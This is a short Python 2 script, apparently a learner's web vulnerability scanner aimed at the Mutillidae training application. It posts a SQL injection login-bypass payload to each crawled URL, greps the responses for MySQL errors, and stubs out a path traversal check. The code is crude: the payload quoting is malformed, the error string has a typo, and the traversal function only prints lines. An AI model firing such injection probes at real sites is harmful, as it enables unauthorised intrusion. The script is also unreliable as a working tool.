import urllib
import urlparse
import urllib2
import re


def read_file(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for line in f:
        #print(line)
        sql_inject(name, line)


def sql_inject(name, link):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    print("Starting SQL Injection....")

    errors = ["MySQl", "error in your SQL"]

    print("[-] Testing Errors: "+link)
    data = urllib.urlencode({"username": "' or 1=1'", "password": "' or 1=1'"})
    request = urllib.urlopen(link, data)
    page = request.read()

    newfile = root_folder + "/" + name + "/" + "sqli.txt"

    for x in errors:
        if x in page:
            g = open(newfile, 'w')

            g.write(
                "\033[01;31mVulnerability Found in: \033[00m\n"
                "\033[01;31m[*] SQL Injection Found : "+link + "\033[00m\n"
            )


def path_traversal(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for line in f:
        if "page=" in line:
            line.split()
            print(line[:])


path_traversal("MUTILLIDAE")